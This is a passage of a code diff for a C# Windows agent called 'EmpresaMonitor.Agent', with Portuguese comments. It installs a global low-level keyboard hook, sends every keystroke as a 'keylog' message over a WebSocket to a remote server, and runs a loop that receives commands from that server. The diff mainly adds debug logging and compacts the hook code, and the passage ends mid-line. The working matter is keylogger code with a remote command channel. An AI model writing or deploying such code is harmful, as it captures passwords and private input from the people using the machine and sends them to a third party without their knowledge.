@@ -11,7 +11,7 @@ using System.Text;
 using System.Text.Json;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms; // Necessário para o enum Keys
+using System.Windows.Forms;
 
 namespace EmpresaMonitor.Agent;
 
@@ -20,8 +20,9 @@ internal static class Program
     [STAThread] 
     static void Main() 
     { 
+        // Inicia a engine e mantém o processo vivo
         _ = StartEngine(); 
-        // Mantém a aplicação viva e processando mensagens do Windows para o Hook
+        // Application.Run é essencial para o Hook de teclado funcionar corretamente
         Application.Run(); 
     }
 
@@ -39,7 +40,9 @@ internal static class Program
         var sendGate = new SemaphoreSlim(1, 1);
         var state = new AgentState { Socket = socket, SendGate = sendGate };
 
-        // Instalação do Hook com tratamento de erro melhorado
+        Console.WriteLine($"[INFO] Iniciando Agente... ID: {agentId}");
+
+        // Instalação do Hook de Teclado
         KeyboardHook.Install(async (k, d) => {
             if (state.Socket?.State == WebSocketState.Open) {
                 await SendKeylog(state.Socket, sendGate, k, d);
@@ -50,9 +53,12 @@ internal static class Program
 
         while (!lifetime.IsCancellationRequested) {
             try {
+                Console.WriteLine($"[INFO] Tentando conectar ao servidor: {BuildConfig.RealtimeUrl}");
                 socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
                 await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), lifetime.Token);
                 
+                Console.WriteLine("[INFO] Conectado ao servidor!");
+
                 await SendJsonAsync(socket, sendGate, new { 
                     type = "agent_hello", 
                     key = BuildConfig.AgentKey, 
@@ -65,8 +71,7 @@ internal static class Program
 
                 await ReceiveLoop(socket, sendGate, lifetime.Token, state);
             } catch (Exception ex) {
-                // Log de erro para debug interno
-                Console.WriteLine($"Conexão perdida: {ex.Message}");
+                Console.WriteLine($"[ERRO CONEXÃO] {ex.Message}. Tentando novamente em 5s...");
                 try { await Task.Delay(5000, lifetime.Token); } catch { }
             }
         }
@@ -74,13 +79,21 @@ internal static class Program
 
     static async Task SendKeylog(ClientWebSocket s, SemaphoreSlim g, string k, bool d) {
         try { 
-            await SendJsonAsync(s, g, new { 
+            // DEBUG: Isso vai aparecer no seu Visual Studio
+            Console.WriteLine($"[DEBUG KEY] Tecla: {k} | Down: {d}"); 
+
+            var payload = new { 
                 type = "keylog", 
                 key = k, 
                 down = d, 
                 ts = DateTime.UtcNow.ToString("HH:mm:ss") 
-            }); 
-        } catch { }
+            };
+
+            await SendJsonAsync(s, g, payload); 
+            Console.WriteLine($"[DEBUG KEY] Enviado para o servidor: {k}");
+        } catch (Exception ex) { 
+            Console.WriteLine($"[ERRO KEYLOG] {ex.Message}"); 
+        }
     }
 
     static async Task ReceiveLoop(ClientWebSocket s, SemaphoreSlim g, CancellationToken ct, AgentState st) {
@@ -101,6 +114,9 @@ internal static class Program
                 var root = doc.RootElement;
                 if (!root.TryGetProperty("type", out var tp)) continue;
                 var type = tp.GetString();
+
+                // Log de comandos recebidos do servidor
+                Console.WriteLine($"[INFO] Comando recebido do servidor: {type}");
 
                 switch (type) {
                     case "access_request":
@@ -249,34 +265,13 @@ public class KeyboardHook {
     [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr h);
     [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
     [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string n);
-
     private const int WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
-    private static IntPtr _h = IntPtr.Zero; 
-    private static LowLevelKeyboardProc? _p; 
-    private static Func<string, bool, Task>? _cb;
-
-    public static void Install(Func<string, bool, Task> callback) { 
-        _cb = callback; 
-        _p = Proc; 
-        _h = SetHook(_p); 
-    }
-
+    private static IntPtr _h = IntPtr.Zero; private static LowLevelKeyboardProc? _p; private static Func<string, bool, Task>? _cb;
+    public static void Install(Func<string, bool, Task> callback) { _cb = callback; _p = Proc; _h = SetHook(_p); }
     private static IntPtr SetHook(LowLevelKeyboardProc p) {
         using var cp = System.Diagnostics.Process.GetCurrentProcess();
         using var cm = cp.MainModule;
         return SetWindowsHookEx(WH_KEYBOARD_LL, p, GetModuleHandle(cm?.ModuleName), 0);
     }
-
     private static IntPtr Proc(int n, IntPtr w, IntPtr l) {
-        if (n == WM_KEYDOWN || n == WM_SYSKEYDOWN) {
-            int vkCode = Marshal.ReadInt32(l);
-            string key = ((Keys)vkCode).ToString();
-            
-            // Dispara o callback em uma Task para não travar a thread do Windows
-            Task.Run(async () => {
-                try { await _cb?.Invoke(key, true); } catch { }
-            });
-        }
-        return CallNextHookEx(_h, n, w, l);
-    }
-}
+        if (n >= 0 && _cb != null)
